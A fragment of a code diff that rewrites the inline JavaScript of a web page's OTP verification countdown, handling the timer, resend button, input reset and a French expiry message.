-otpBtn.classList.remove("active")
-
-const timer=setInterval(()=>{
-
-t--
-
-time.textContent=t
-
-if(t<=0){
-
-clearInterval(timer)
-
-resendBtn.classList.add("active")
-
-otpInputs.forEach(i=>i.disabled=true)
-
-otpBtn.classList.remove("active")
-
-maskedNumber.innerHTML="Le code a expiré. Demandez un nouveau OTP"
-
+  let t=120;
+  const timeEl=document.getElementById("time");
+  const resendBtn=document.getElementById("resendBtn");
+  timeEl.textContent=t;
+  resendBtn.classList.remove("active");resendClicked=false;
+  resetOtp(false);
+  document.getElementById("mainBtn").classList.remove("active");
+  const timer=setInterval(()=>{
+    t--;timeEl.textContent=t;
+    if(t<=0){
+      clearInterval(timer);resendBtn.classList.add("active");resetOtp(true);
+      document.getElementById("mainBtn").classList.remove("active");
+      document.getElementById("maskedNumber").textContent="Le code a expiré. Demandez un nouveau OTP.";
+    }
+  },1000);
 }
-
-},1000)
-
-}
-
 </script>
-
 </body>
-
 </html>
